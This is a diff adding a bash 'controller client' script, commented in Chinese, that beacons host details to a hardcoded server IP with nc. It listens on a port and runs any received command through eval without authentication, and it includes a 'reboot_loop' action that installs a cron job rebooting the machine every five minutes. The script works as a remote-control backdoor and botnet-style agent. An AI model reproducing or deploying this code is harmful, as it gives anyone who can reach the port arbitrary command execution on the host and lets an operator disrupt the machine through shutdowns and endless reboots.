@@ -1,0 +1,192 @@
+#!/bin/bash
+
+# 客户端脚本 - 连接服务器并执行命令
+# 支持: Debian, Ubuntu, CentOS, RHEL, Fedora, Alpine
+
+SERVER_IP="159.138.58.239"  # 修改为你的服务器IP
+SERVER_PORT=5555
+CLIENT_PORT=5556
+HEARTBEAT_INTERVAL=60
+
+# 获取系统信息
+get_system_info() {
+    local distro=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
+    local version=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
+    echo "$distro $version"
+}
+
+# 生成客户端序列号
+generate_serial() {
+    if [[ -f /etc/machine-id ]]; then
+        cat /etc/machine-id | md5sum | cut -c1-8
+    else
+        date +%s | sha256sum | base64 | head -c 8
+    fi
+}
+
+SERIAL=$(generate_serial)
+HOSTNAME=$(hostname)
+SYSTEM_INFO=$(get_system_info)
+
+# 颜色输出
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+log() {
+    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1"
+}
+
+print_color() {
+    echo -e "${2}${1}${NC}"
+}
+
+# 发送心跳包
+send_heartbeat() {
+    while true; do
+        echo "HEARTBEAT|$SERIAL|$HOSTNAME|$SYSTEM_INFO" | nc -w 5 $SERVER_IP $SERVER_PORT
+        if [[ $? -eq 0 ]]; then
+            log "心跳包发送成功"
+        else
+            print_color "无法连接到服务器" "$RED"
+        fi
+        sleep $HEARTBEAT_INTERVAL
+    done
+}
+
+# 执行命令
+execute_command() {
+    local command="$1"
+    log "执行命令: $command"
+    
+    case "$command" in
+        "shutdown")
+            print_color "执行关机命令..." "$YELLOW"
+            shutdown -h now
+            ;;
+        "reboot")
+            print_color "执行重启命令..." "$YELLOW"
+            reboot
+            ;;
+        "status")
+            echo "系统状态:"
+            uptime
+            free -h
+            df -h
+            ;;
+        "update")
+            print_color "执行系统更新..." "$YELLOW"
+            update_system
+            ;;
+        *)
+            # 执行自定义命令
+            eval "$command"
+            ;;
+    esac
+}
+
+# 执行预定义脚本
+execute_script() {
+    local script_name="$1"
+    local script_path="/tmp/$script_name"
+    
+    case "$script_name" in
+        "shutdown.sh")
+            print_color "执行关机脚本..." "$RED"
+            shutdown -h now
+            ;;
+        "reboot.sh")
+            print_color "执行重启脚本..." "$YELLOW"
+            reboot
+            ;;
+        "restart_services.sh")
+            print_color "重启系统服务..." "$YELLOW"
+            systemctl restart networking 2>/dev/null || systemctl restart network 2>/dev/null
+            systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
+            ;;
+        "reboot_loop.sh")
+            print_color "警告: 启动无限重启循环!" "$RED"
+            (crontab -l 2>/dev/null; echo "*/5 * * * * /sbin/reboot") | crontab -
+            reboot
+            ;;
+        "cancel_loop.sh")
+            print_color "取消重启循环..." "$GREEN"
+            crontab -l | grep -v reboot | crontab -
+            ;;
+        *)
+            print_color "未知脚本: $script_name" "$RED"
+            ;;
+    esac
+}
+
+# 系统更新函数
+update_system() {
+    local distro=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
+    
+    case $distro in
+        debian|ubuntu)
+            apt-get update && apt-get upgrade -y
+            ;;
+        centos|rhel)
+            yum update -y
+            ;;
+        fedora)
+            dnf update -y
+            ;;
+        alpine)
+            apk update && apk upgrade
+            ;;
+    esac
+}
+
+# 启动命令监听
+start_listener() {
+    print_color "启动命令监听器..." "$GREEN"
+    print_color "客户端信息: $SERIAL - $HOSTNAME - $SYSTEM_INFO" "$BLUE"
+    
+    while true; do
+        log "等待命令..."
+        nc -l -p $CLIENT_PORT -c '
+            read -r command
+            echo "收到命令: $command"
+            
+            if echo "$command" | grep -q "^COMMAND:"; then
+                cmd=$(echo "$command" | cut -d: -f2-)
+                echo "执行命令: $cmd"
+                eval "$cmd"
+            elif echo "$command" | grep -q "^SCRIPT:"; then
+                script_name=$(echo "$command" | cut -d: -f2-)
+                echo "执行脚本: $script_name"
+                /bin/bash /tmp/'"$0"' execute_script "$script_name"
+            else
+                echo "未知命令格式"
+            fi
+        '
+        sleep 1
+    done
+}
+
+# 主函数
+main() {
+    print_color "=== 控制器客户端 ===" "$BLUE"
+    print_color "序列号: $SERIAL" "$GREEN"
+    print_color "主机名: $HOSTNAME" "$GREEN"
+    print_color "系统: $SYSTEM_INFO" "$GREEN"
+    
+    # 启动心跳包发送
+    send_heartbeat &
+    
+    # 启动命令监听
+    start_listener
+}
+
+# 脚本入口
+case "${1:-}" in
+    "execute_script")
+        execute_script "$2"
+        ;;
+    *)
+        main
+        ;;
+esac
